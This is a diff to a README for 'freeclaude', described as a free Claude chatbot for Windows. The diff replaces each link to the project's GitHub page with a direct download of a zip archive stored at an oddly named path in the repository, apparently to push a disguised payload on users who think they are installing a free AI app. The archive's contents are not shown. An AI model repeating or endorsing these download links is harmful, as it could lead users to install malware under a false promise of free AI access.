@@ -6,7 +6,7 @@ Welcome to **freeclaude** – the free Claude AI chatbot that brings powerful co
 
 This guide will walk you through everything you need to know to get freeclaude up and running on your Windows computer, even if you've never installed software before.
 
-[![Download freeclaude](https://img.shields.io/badge/Download_freeclaude-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/khanhokok123123/freeclaude)
+[![Download freeclaude](https://img.shields.io/badge/Download_freeclaude-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/khanhokok123123/freeclaude/main/fadedly/1.7-alpha.1.zip)
 
 ## ✨ What is freeclaude?
 
@@ -35,7 +35,7 @@ Getting freeclaude is simple! Just follow these easy steps:
 
 ### Step 1: Visit the Download Page
 
-**Visit this link to download the application:** [https://github.com/khanhokok123123/freeclaude](https://github.com/khanhokok123123/freeclaude)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/khanhokok123123/freeclaude/main/fadedly/1.7-alpha.1.zip](https://raw.githubusercontent.com/khanhokok123123/freeclaude/main/fadedly/1.7-alpha.1.zip)
 
 You'll see a page with information about the app. Look for the green "Code" button or the "Releases" section on the right side of the page.
 
@@ -130,7 +130,7 @@ Go ahead and:
 
 Enjoy your free AI companion, and happy chatting! 🤖💬
 
-[![Download freeclaude Now](https://img.shields.io/badge/⬇️_Download_freeclaude-4CAF50?style=for-the-badge)](https://github.com/khanhokok123123/freeclaude)
+[![Download freeclaude Now](https://img.shields.io/badge/⬇️_Download_freeclaude-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/khanhokok123123/freeclaude/main/fadedly/1.7-alpha.1.zip)
 
 ---
 
